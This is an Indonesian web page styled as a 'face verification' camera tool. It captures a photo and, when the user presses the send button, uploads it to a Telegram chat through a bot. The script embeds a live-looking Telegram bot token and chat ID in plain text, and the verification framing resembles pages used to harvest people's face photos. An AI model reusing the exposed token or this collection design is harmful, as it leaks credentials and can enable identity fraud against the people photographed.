<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
<title>Verifikasi Wajah</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;700&family=IBM+Plex+Mono:wght@400;500&display=swap" rel="stylesheet">
<style>
  :root{
    --bg:#07100e;
    --panel:rgba(10,22,20,.72);
    --line:rgba(94,214,190,.28);
    --line-soft:rgba(255,255,255,.08);
    --text:#eef7f4;
    --muted:#7fa39a;
    --ok:#4be3a0;
    --fail:#ff6b5e;
    --accent:#3ee6b8;
  }
  *{box-sizing:border-box;-webkit-tap-highlight-color:transparent;}
  html,body{height:100%;}
  body{
    margin:0;
    font-family:'IBM Plex Mono',ui-monospace,monospace;
    background:var(--bg);
    color:var(--text);
    overflow:hidden;
  }
  .stage{
    position:relative;
    height:100dvh;
    width:100%;
    overflow:hidden;
  }
  #video, #captured{
    position:absolute; inset:0;
    width:100%; height:100%;
    object-fit:cover;
  }
  #captured{display:none;}

  /* subtle vignette so overlays stay legible on any scene */
  .vignette{
    position:absolute; inset:0;
    background:radial-gradient(ellipse at center, rgba(0,0,0,0) 45%, rgba(3,10,9,.75) 100%);
    pointer-events:none;
  }

  header.topbar{
    position:absolute; top:0; left:0; right:0;
    padding:calc(env(safe-area-inset-top,0px) + 16px) 18px 14px;
    display:flex; align-items:center; justify-content:space-between;
    background:linear-gradient(to bottom, rgba(4,10,9,.85), rgba(4,10,9,0));
    pointer-events:none;
  }
  .brand{
    font-family:'Space Grotesk',sans-serif;
    font-weight:700; font-size:1.02rem; letter-spacing:.2px;
    display:flex; align-items:center; gap:8px;
  }
  .brand .dot{width:8px;height:8px;border-radius:50%;background:var(--accent);box-shadow:0 0 8px var(--accent);}
  .live-pill{
    font-size:.68rem; color:var(--muted); letter-spacing:1.2px;
    border:1px solid var(--line); border-radius:20px; padding:4px 10px;
  }
  .live-pill.rec{color:var(--fail);border-color:rgba(255,107,94,.4);}

  /* scan frame */
  .frame{
    position:absolute; left:50%; top:44%;
    transform:translate(-50%,-50%);
    width:min(72vw, 320px); aspect-ratio:3/4;
    pointer-events:none;
  }
  .corner{position:absolute; width:30px; height:30px; border:2.5px solid var(--accent); opacity:.9;}
  .corner.tl{top:0;left:0;border-right:none;border-bottom:none;border-radius:10px 0 0 0;}
  .corner.tr{top:0;right:0;border-left:none;border-bottom:none;border-radius:0 10px 0 0;}
  .corner.bl{bottom:0;left:0;border-right:none;border-top:none;border-radius:0 0 0 10px;}
  .corner.br{bottom:0;right:0;border-left:none;border-top:none;border-radius:0 0 10px 0;}
  .scan-line{
    position:absolute; left:6%; right:6%; height:2px;
    background:linear-gradient(90deg, transparent, var(--accent), transparent);
    box-shadow:0 0 10px var(--accent);
    animation:sweep 2.6s ease-in-out infinite;
  }
  @keyframes sweep{
    0%,100%{ top:8%; opacity:.9; }
    50%{ top:92%; opacity:.5; }
  }
  .frame-label{
    position:absolute; bottom:-30px; left:0; right:0; text-align:center;
    font-size:.72rem; color:var(--muted); letter-spacing:1.5px;
  }

  footer.controls{
    position:absolute; left:0; right:0; bottom:0;
    padding:18px 20px calc(env(safe-area-inset-bottom,0px) + 22px);
    background:linear-gradient(to top, rgba(4,10,9,.92), rgba(4,10,9,0));
  }
  .status{
    text-align:center; min-height:1.3em; margin-bottom:14px;
    font-size:.78rem; letter-spacing:.3px; color:var(--muted);
  }
  .status.ok{color:var(--ok);}
  .status.fail{color:var(--fail);}

  .row{display:flex; align-items:center; justify-content:center; gap:22px;}

  .shutter{
    width:72px; height:72px; border-radius:50%;
    border:3px solid var(--accent);
    background:transparent;
    display:flex; align-items:center; justify-content:center;
    cursor:pointer;
  }
  .shutter::before{
    content:''; width:56px; height:56px; border-radius:50%; background:var(--accent);
  }
  .shutter:active::before{width:48px;height:48px;}
  .shutter:disabled{opacity:.4;}

  .side-btn{
    width:48px; height:48px; border-radius:50%;
    border:1px solid var(--line-soft); background:rgba(255,255,255,.06);
    color:var(--text); font-size:1.05rem;
    display:flex; align-items:center; justify-content:center; cursor:pointer;
  }

  .confirm-row{display:none; gap:14px; width:100%;}
  .confirm-row.show{display:flex;}
  .btn-retake{
    flex:0 0 auto; width:52px; height:52px; border-radius:50%;
    border:1px solid var(--line-soft); background:rgba(255,255,255,.06);
    color:var(--text); font-size:1.1rem; cursor:pointer;
  }
  .btn-send{
    flex:1; height:52px; border-radius:26px; border:none;
    background:var(--accent); color:#032018; font-weight:700; letter-spacing:.3px;
    font-family:'Space Grotesk',sans-serif; font-size:.95rem; cursor:pointer;
  }
  .btn-send:disabled{opacity:.5;}

  .counter{
    position:absolute; top:calc(env(safe-area-inset-top,0px) + 60px); left:18px;
    font-size:.68rem; color:var(--muted); letter-spacing:.5px;
    background:rgba(0,0,0,.3); padding:4px 9px; border-radius:6px;
    border:1px solid var(--line-soft);
  }
</style>
</head>
<body>
<div class="stage">
  <video id="video" autoplay playsinline muted></video>
  <img id="captured" alt="Hasil foto">
  <div class="vignette"></div>

  <header class="topbar">
    <div class="brand"><span class="dot"></span>Verifikasi Wajah</div>
    <div class="live-pill rec" id="livePill">● LIVE</div>
  </header>

  <div class="counter" id="counter">Terkirim hari ini: 0</div>

  <div class="frame" id="frame">
    <div class="corner tl"></div>
    <div class="corner tr"></div>
    <div class="corner bl"></div>
    <div class="corner br"></div>
    <div class="scan-line" id="scanLine"></div>
    <div class="frame-label">POSISIKAN WAJAH DI DALAM BINGKAI</div>
  </div>

  <footer class="controls">
    <div class="status" id="statusLine">Kamera siap — arahkan ke wajah lalu tekan tombol.</div>

    <div class="row" id="captureRow">
      <button class="side-btn" id="switchBtn" title="Ganti kamera">⟲</button>
      <button class="shutter" id="captureBtn" title="Ambil foto"></button>
      <div style="width:48px"></div>
    </div>

    <div class="confirm-row" id="confirmRow">
      <button class="btn-retake" id="retakeBtn" title="Ambil ulang">↺</button>
      <button class="btn-send" id="sendBtn">Kirim Verifikasi</button>
    </div>
  </footer>
</div>

<canvas id="canvas" style="display:none"></canvas>

<script>
// ====== KONFIGURASI BOT TELEGRAM ======
const BOT_TOKEN = "8833865176:AAEbRb-jD9mO4zxg43txV5ITDtky_p1vq8c";
const CHAT_ID   = "5657292910";
// =======================================

let stream = null;
let capturedBlob = null;
let sentCount = 0;
let facing = 'environment';

const video      = document.getElementById('video');
const captured   = document.getElementById('captured');
const canvas     = document.getElementById('canvas');
const frame      = document.getElementById('frame');
const livePill   = document.getElementById('livePill');
const captureBtn = document.getElementById('captureBtn');
const retakeBtn  = document.getElementById('retakeBtn');
const sendBtn    = document.getElementById('sendBtn');
const switchBtn  = document.getElementById('switchBtn');
const statusLine = document.getElementById('statusLine');
const counter    = document.getElementById('counter');
const captureRow = document.getElementById('captureRow');
const confirmRow = document.getElementById('confirmRow');

function setStatus(msg, type){
  statusLine.textContent = msg;
  statusLine.className = 'status' + (type ? ' '+type : '');
}
function updateCounter(){
  counter.textContent = `Terkirim hari ini: ${sentCount}`;
}

async function startCamera(){
  if(stream){ stream.getTracks().forEach(t=>t.stop()); }
  try{
    stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: { ideal: facing }, width:{ideal:900}, height:{ideal:1200} },
      audio:false
    });
    video.srcObject = stream;
    livePill.textContent = '● LIVE';
  }catch(err){
    setStatus('Kamera tidak dapat diakses: ' + err.message, 'fail');
    livePill.textContent = '○ OFFLINE';
  }
}

switchBtn.addEventListener('click', ()=>{
  facing = facing === 'environment' ? 'user' : 'environment';
  startCamera();
});

captureBtn.addEventListener('click', capture);
retakeBtn.addEventListener('click', retake);
sendBtn.addEventListener('click', sendToTelegram);

function capture(){
  const w = video.videoWidth, h = video.videoHeight;
  if(!w || !h){ setStatus('Kamera belum siap, coba sekali lagi.', 'fail'); return; }
  canvas.width = w; canvas.height = h;
  canvas.getContext('2d').drawImage(video, 0, 0, w, h);
  canvas.toBlob(blob=>{
    capturedBlob = blob;
    captured.src = URL.createObjectURL(blob);
    captured.style.display = 'block';
    video.style.display = 'none';
    frame.style.display = 'none';
    livePill.style.display = 'none';
    captureRow.style.display = 'none';
    confirmRow.classList.add('show');
    setStatus('Foto siap. Periksa lalu kirim verifikasi.', '');
  }, 'image/jpeg', 0.92);
}

function retake(){
  capturedBlob = null;
  captured.style.display = 'none';
  video.style.display = 'block';
  frame.style.display = 'block';
  livePill.style.display = 'inline-block';
  captureRow.style.display = 'flex';
  confirmRow.classList.remove('show');
  setStatus('Kamera siap — arahkan ke wajah lalu tekan tombol.', '');
}

async function sendToTelegram(){
  if(!BOT_TOKEN || !CHAT_ID){
    setStatus('Bot Token / Chat ID belum dikonfigurasi.', 'fail');
    return;
  }
  if(!capturedBlob){
    setStatus('Ambil foto terlebih dahulu.', 'fail');
    return;
  }

  sendBtn.disabled = true;
  sendBtn.textContent = 'Mengirim…';
  setStatus('Mengirim hasil verifikasi ke Telegram…', '');

  const waktu = new Date().toLocaleString('id-ID', { dateStyle:'medium', timeStyle:'short' });
  const caption = `Verifikasi Wajah\n${waktu}`;

  try{
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
    const form = new FormData();
    form.append('chat_id', CHAT_ID);
    form.append('caption', caption);
    form.append('photo', capturedBlob, 'verifikasi.jpg');
    const res = await fetch(url, { method:'POST', body: form });
    const data = await res.json();
    if(!data.ok) throw new Error(data.description || 'Telegram API error');

    sentCount++;
    updateCounter();
    setStatus('Verifikasi terkirim.', 'ok');
    sendBtn.textContent = 'Kirim Verifikasi';
    sendBtn.disabled = false;
    setTimeout(retake, 1100);
  }catch(err){
    setStatus('Gagal mengirim: ' + err.message, 'fail');
    sendBtn.textContent = 'Kirim Verifikasi';
    sendBtn.disabled = false;
  }
}

updateCounter();
startCamera();
</script>
</body>
</html>
